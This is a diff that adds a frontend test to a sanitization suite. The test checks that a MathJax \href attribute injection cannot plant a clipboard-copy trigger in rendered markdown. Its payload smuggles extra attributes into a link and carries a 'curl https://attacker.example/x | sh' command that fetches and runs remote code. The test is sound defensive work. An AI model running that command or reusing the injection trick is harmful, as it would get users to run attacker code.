@@ -69,6 +69,23 @@ describe("MarkdownDiv rendered HTML sanitization", () => {
     }
   );
 
+  it("does not let MathJax href attribute injection plant a clipboard copy trigger", async () => {
+    // Plain HTML in markdown is entity-escaped before markdown-it runs, but
+    // \href reaches the sanitizer as a real SVG anchor carrying these
+    // attributes; the global clipboard delegate would copy from it on click.
+    const payload =
+      '$\\href{x" class="copy-button" data-clipboard-text="curl https://attacker.example/x | sh}{y}$';
+    const { container } = render(<MarkdownDiv markdown={payload} />);
+
+    await waitFor(() => {
+      expect(container.querySelector("mjx-container a")).not.toBeNull();
+    });
+
+    expect(container.querySelector(".copy-button")).toBeNull();
+    expect(container.querySelector("[data-clipboard-text]")).toBeNull();
+    expect(container.innerHTML).not.toContain("attacker.example");
+  });
+
   it("replaces remote markdown images with external links", async () => {
     const { container } = render(
       <MarkdownDiv markdown="![pixel](https://example.com/pixel.png)" />
